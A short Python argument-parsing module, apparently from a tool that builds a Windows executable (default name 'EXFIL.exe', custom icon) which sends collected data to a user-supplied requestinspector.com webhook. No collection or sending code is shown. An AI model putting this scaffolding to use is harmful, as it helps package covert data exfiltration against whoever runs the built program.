import argparse
import re


def get_parsed_args():
    
    parser = argparse.ArgumentParser()
    parser.add_argument('webhook', help="webhook URL to send the data. Create your own at https://requestinspector.com/")
    
    # Add arguments for executable
    group = parser.add_argument_group('executable', "Arguments to modify the executable to generate. Only work with build.py")
    group.add_argument('-n', '--name', default='EXFIL', help="name of the executable. Default: EXFIL.exe")
    group.add_argument('-i', '--icon', default='NONE', help="icon file of the executable. Default: NONE")
    
    # Process the arguments
    args = parser.parse_args()
    args.webhook = re.sub(r"(?<=https://requestinspector\.com)/p/", '/inspect/', args.webhook)
    args.name = args.name.removesuffix('.exe')
    
    return args
